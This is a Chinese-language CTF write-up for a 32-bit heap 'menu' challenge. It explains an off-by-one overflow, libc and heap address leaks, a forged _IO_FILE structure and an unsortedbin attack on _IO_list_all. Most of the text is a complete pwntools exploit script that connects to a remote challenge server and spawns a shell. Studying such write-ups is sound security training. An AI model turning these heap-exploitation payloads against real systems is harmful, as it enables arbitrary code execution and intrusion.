# Pwn2 write_up #
flag  
ctf{W3lc0m4_t0_ISC_0ld_Sty1e_Menu_Cha113nge_1a0}
![flag](https://raw.githubusercontent.com/fade-vivida/CTF/master/llh/picture/llh.JPG)

# 1.题目分析 #
程序共涉及了两个结构体，一个结构体为mailbox，另一个为letter。  
其中letter结构体的大小为0x2C。  
这两个结构体的成员变量如下所示：  
![2](https://raw.githubusercontent.com/fade-vivida/CTF/master/llh/picture/2.JPG)  
存在漏洞函数如下所示：  
![1](https://raw.githubusercontent.com/fade-vivida/CTF/master/llh/picture/1.JPG)  
存在一字节溢出漏洞（off by one）
## 2.利用过程 ##
### 2.1 libc地址泄露 ###

	add(0x48,'a','b\n')			#0
	delete(0)

	add(8,'a','b\n')			#1
	
	payload = '\x00'*0x20 + '\x41'
	add(8,'a',payload)			#2

	delete(1)

	payload = '\x00'*0x2c + p32(0x11)+ p32(setbuf_got)
	add(0x38,payload,'b\n')		#3
	
	check()
由分析可知，用户每次写一封letter时，会申请两个chunk，其中一个为用户自定义大小，保存信件内容。另一个为固定大小0x2c，为一个letter结构体。因此，根据该特性，采用如上所示chunk布局，则可以使chunk2改写chunk1的size字段，由于保存堆指针的数组也在堆中，因此可以修改其大小使其包含堆指针列表，发生overlap，从而改写堆指针列表，泄露出libc。
### 2.2 泄露堆地址 ###
	mainarena = libc.address + 0x1B0780
	lg('mainarena',mainarena)
	top_chunk = mainarena + 0x30

	add(8,'a','b\n')		#4
	add(8,'a','b\n')		#5
	delete(4)

	payload = '\x00'*0x20 + '\x51'
	add(8,'a',payload)		#6

	delete(5)

	payload = '\x00'*0x2c + p32(0x21) + p32(top_chunk-0xc)
	add(0x48,payload,'b\n')		#7

	check()
	ru('To: ')
	heap_base = u32(rv(4)) - 0x1b0
	lg('heap_addr',heap_base)
方法与泄露libc相同，打印main\_arena中top_chunk处的值，然后减去当前偏移，得到堆地址。
### 2.3 伪造\_IO\_FILE结构体 ###
通过实际调试发现该题目无法使用fastbin attack攻击，因此考虑使用unsortedbin attack改写\_IO\_list\_all指针，使其指向main\_arena结构体top\_chunk处，然后再计算\_IO\_FILE结构体中\_chain变量偏移地址（+0x34），该地址正好对向大小为0x30的smallbin链表。然后再次通过overlap，改写该smallbin内容为伪造的\_IO\_FILE结构体。  
代码如下所示:  
**注：由于该smallbin大小正好与letter结构体大小相同，伪造过程简直想吐血。。。**

	add(8,'a','b\n')		#8
	add(8,'a','b\n')		#9
	delete(8)

	payload = '\x00'*0x20 + '\x99'
	add(8,'a',payload)		#10
	delete(10)

	# add(0x28,'a','b\n')

	# delete(9)
	
	add(0x60,'a','b\n')		#11
	add(8,'a','b\n')		#12

	delete(11)
	add(0x30,'a','b\n')		#13
	delete(12)
	payload = '\x00'*0x20 + p32(0)*7 + p32(0x11)
	add(0x48,payload,'b\n')		#14
	

	delete(9)
	delete(7)
	payload = '\x00'*0x2c + p32(0x31) + p32(0) + p32(heap_base+0x2f0)
	payload += '\x00'*0x24 + p32(0xe9)
	add(0x90,payload,'b\n')		#15

	delete(13)

	one_gadget = libc.address + 0x5f066
	payload = '\x00'*0x30
	payload += p32(0x80) + p32(0xc1) + p32(0xc1) + p32(0xc1)
	payload += p32(0) + p32(1) + p32(1)
	payload += p32(0)*7
	payload += p32(3) + p32(0) + p32(0xffffffff) + p32(0) + p32(heap_base+0x400)
	payload += p32(0xffffffff)*2 + p32(0) + p32(heap_base+0x500)
	payload += p32(0)*3 + p32(0xffffffff) + p32(0)*10
	payload += p32(heap_base+0x310)
	payload += p32(one_gadget)*5

	add(0xe0,payload,'b\n')		#16

	delete(15)
	delete(16)
### 2.4 Unsortedbin attack ###
最后使用Unsortedbin attack改写\_IO\_list\_all，然后释放一个非法的chunk，从而得到shell
## 3.完成exp ##
	
	from pwn import *
	from ctypes import *
	import os
	#import roputils as rop
	
	remote_addr = "59.110.167.41"
	remote_port = 31339
	
	local_addr = "127.0.0.1"
	local_port = 1807
	
	pc = "./chall"
	pwn_elf = ELF(pc)
	pwn_rop = rop.ROP(pc)
	
	uselibc = 1 #0 for no,1 for i386,2 for x64
	local = 0
	haslibc = 1
	atta = 0
	
	if uselibc == 2:
		context.arch = "amd64"
	else:
		context.arch = "i386"
	
	if uselibc ==2 and haslibc == 0:
		libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	else:
		if uselibc == 1 and haslibc == 0:
			libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
		else:
			libc = ELF('./libc.so.6')
	
	if local == 1:
		if haslibc:
			p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
		else:
			p = process(pc)
	elif local == 0:
		p = remote(remote_addr,remote_port)
		if haslibc:
			libc = ELF('./libc.so.6')
	else:
		p = remote(local_addr,local_port)
		if haslibc:
			libc = ELF('./libc.so.6')
	
	context.log_level = True
	
	if local:
		if atta:
			gdb.attach(p,'b *0x8048922\n b*0x8048802\n b*0x8048840\n b*0x08048A78')
	
	
	def sla(a,b):
		p.sendlineafter(a,b)
	
	def sa(a,b):
		p.sendafter(a,b)
	
	def ru(a):
		p.recvuntil(a)
	
	def rv(a):
		return p.recv(a)
	
	
	def lg(s,addr):
		print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
	
	def add(size,content,to):
		sla('Select:\n','1')
		sla('Size:\n',str(size))
		sla('Content:\n',content)
		sa('To:\n',to)
	
	def check():
		sla('Select:\n','2')
	
	def delete(idx):
		sla('Select:\n','3')
		sla('Index:\n',str(idx))
	
	def hack():
		raw_input()
		setbuf_got = pwn_elf.got['setbuf']
		fread_offset = libc.symbols['fread']
	
		add(0x48,'a','b\n')			#0
		delete(0)
	
		add(8,'a','b\n')			#1
		
		payload = '\x00'*0x20 + '\x41'
		add(8,'a',payload)			#2
	
		delete(1)
	
		payload = '\x00'*0x2c + p32(0x11)+ p32(setbuf_got)
		add(0x38,payload,'b\n')		#3
		
		check()
		
		ru('To: ')
		rv(8)
		fread_addr = u32(rv(4))
		lg('setbuf',fread_addr)
	
		libc.address = fread_addr - fread_offset
		lg('libc',libc.address)
		system_addr = libc.symbols['system']
		lg('system',system_addr)
	
		#calloc_hook = libc.symbols['__calloc_hook']
		realloc_hook = libc.symbols['__realloc_hook']
		free_hook = libc.symbols['__free_hook']
		#lg('calloc_hook',calloc_hook)
		lg('realloc_hook',realloc_hook)
		lg('free_hook',free_hook)
	
		mainarena = libc.address + 0x1B0780
		lg('mainarena',mainarena)
		top_chunk = mainarena + 0x30
	
		add(8,'a','b\n')		#4
		add(8,'a','b\n')		#5
		delete(4)
	
		payload = '\x00'*0x20 + '\x51'
		add(8,'a',payload)		#6
	
		delete(5)
	
		payload = '\x00'*0x2c + p32(0x21) + p32(top_chunk-0xc)
		add(0x48,payload,'b\n')		#7
	
		check()
		ru('To: ')
		heap_base = u32(rv(4)) - 0x1b0
		lg('heap_addr',heap_base)
	
	
	
	
		add(8,'a','b\n')		#8
		add(8,'a','b\n')		#9
		delete(8)
	
		payload = '\x00'*0x20 + '\x99'
		add(8,'a',payload)		#10
		delete(10)
	
		# add(0x28,'a','b\n')
	
		# delete(9)
		
		add(0x60,'a','b\n')		#11
		add(8,'a','b\n')		#12
	
		delete(11)
		add(0x30,'a','b\n')		#13
		delete(12)
		payload = '\x00'*0x20 + p32(0)*7 + p32(0x11)
		add(0x48,payload,'b\n')		#14
		
	
		delete(9)
		delete(7)
		payload = '\x00'*0x2c + p32(0x31) + p32(0) + p32(heap_base+0x2f0)
		payload += '\x00'*0x24 + p32(0xe9)
		add(0x90,payload,'b\n')		#15
	
		delete(13)
	
		one_gadget = libc.address + 0x5f066
		payload = '\x00'*0x30
		payload += p32(0x80) + p32(0xc1) + p32(0xc1) + p32(0xc1)
		payload += p32(0) + p32(1) + p32(1)
		payload += p32(0)*7
		payload += p32(3) + p32(0) + p32(0xffffffff) + p32(0) + p32(heap_base+0x400)
		payload += p32(0xffffffff)*2 + p32(0) + p32(heap_base+0x500)
		payload += p32(0)*3 + p32(0xffffffff) + p32(0)*10
		payload += p32(heap_base+0x310)
		payload += p32(one_gadget)*5
	
		add(0xe0,payload,'b\n')		#16
	
		delete(15)
		delete(16)
	
		IO_list_all = libc.symbols['_IO_list_all']
	
		payload = '\x00'*0x5c + p32(0xe9) + p32(0) + p32(IO_list_all-0x8)
		add(0x90,payload,'b\n')
	
		one_gadget = libc.address + 0x5f066
		payload = '\x00'*0x30
		payload += '/bin/sh\0' + p32(0) + p32(0)
		payload += p32(0) + p32(1) + p32(1)
		payload += p32(0)*7
		payload += p32(3) + p32(0) + p32(0xffffffff) + p32(0) + p32(heap_base+0x400)
		payload += p32(0xffffffff)*2 + p32(0) + p32(heap_base+0x500)
		payload += p32(0)*3 + p32(0xffffffff) + p32(0)*10
		payload += p32(heap_base+0x310)
		payload += p32(system_addr)*5
	
		add(0xe0,payload,'b\n')
	
		delete(0)
		# delete(12)
	
		# for i in range(20):
		# 	add(8,'a','b\n')
		# for i in range(8,28):
		# 	delete(i)
		# print('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n')
		
	
		# #global_max_fast = libc.address + 0x1b18e0
		
		# IO_list_all = libc.symbols['_IO_list_all']
		# add(8,'a','b\n')		#4
		# add(8,'a','b\n')		#5
		# add(0x48,'a','b\n')		#6
		# add(8,'a','b\n')		#7
	
		# #delete(6)
		# delete(4)
		# payload = '\x00'*0x20 + '\xe1'
		# add(8,'a',payload)		#8
	
		# delete(5)
		# delete(6)
		# payload = '\x00'*0x2c + p32(0x21) + '\x00'*0x1c + p32(0x51)
		# payload += p32(0) + p32(global_max_fast-0x8)
		# payload += '\x00'*0x40 + p32(0x50) + p32(0x30)
		# payload += '\x00'*0x2c + p32(0x11) + p32(0)*2
		# add(0xd8,payload,'b\n')
	
		# add(0x48,'a','b')
		p.interactive()
	hack()